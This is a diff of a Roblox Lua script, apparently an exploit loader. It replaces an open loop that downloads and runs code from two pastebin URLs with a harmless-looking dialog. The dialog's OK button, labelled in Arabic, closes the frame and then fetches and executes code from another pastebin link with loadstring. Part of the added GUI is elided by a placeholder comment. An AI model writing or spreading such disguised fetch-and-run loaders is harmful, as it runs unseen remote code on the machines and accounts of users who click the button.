@@ -1,23 +1,42 @@
-local scripts = {
-'https://pastebin.com/raw/vcLwGMEz',
-'https://pastebin.com/raw/VYJMyQzn'
-}
+-- Create the ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "ImageTextGui"
+screenGui.Parent = game.Players.LocalPlayer.PlayerGui
 
-local function executeScripts()
-    for _, url in ipairs(scripts) do
-        local success, result = pcall(function()
-            local script = game:HttpGet(url) -- Fetch the script content
-            loadstring(script)() -- Execute the script
-        end)
+-- Create the Frame (Rectangular)
+local frame = Instance.new("Frame")
+frame.Name = "MainFrame"
+frame.Size = UDim2.new(0, 450, 0, 300)
+frame.Position = UDim2.new(0.5, -225, 0.5, -150)
+frame.BackgroundColor3 = Color3.new(0, 0, 0)
+frame.BackgroundTransparency = 0.5
+frame.BorderSizePixel = 3
+frame.BorderColor3 = Color3.new(1, 0, 0)
+frame.Parent = screenGui
 
-        -- Log an error message if the script fails to load or execute
-        if not success then
-            warn("Error loading script from " .. url .. ": " .. result)
-        end
-        
-        wait(2) -- Wait for 2 seconds before executing the next script
-    end
-end
+-- Decorative elements (lines, corners)
+local topLine = Instance.new("Frame")
+topLine.Name = "TopLine"
+topLine.Size = UDim2.new(1, 0, 0, 2)
+topLine.Position = UDim2.new(0, 0, 0, 0)
+topLine.BackgroundColor3 = Color3.new(1, 0, 0)
+topLine.Parent = frame
 
--- Call the function to execute the scripts
-executeScripts()
+-- ... (rest of the GUI elements - same as before) ...
+
+-- Create the Ok Button
+local okButton = Instance.new("TextButton")
+okButton.Name = "OkButton"
+okButton.Size = UDim2.new(0, 120, 0, 40)
+okButton.Position = UDim2.new(0.5, -60, 0.85, 0)
+okButton.Text = "موافق!"
+okButton.BackgroundColor3 = Color3.new(0, 1, 0)
+okButton.Font = Enum.Font.SciFi
+okButton.TextScaled = true
+okButton.Parent = frame
+
+-- Ok Button Functionality (updated)
+okButton.MouseButton1Click:Connect(function()
+    frame:Destroy()
+    loadstring(game:HttpGet("https://pastebin.com/raw/g04krvDq"))()
+end)
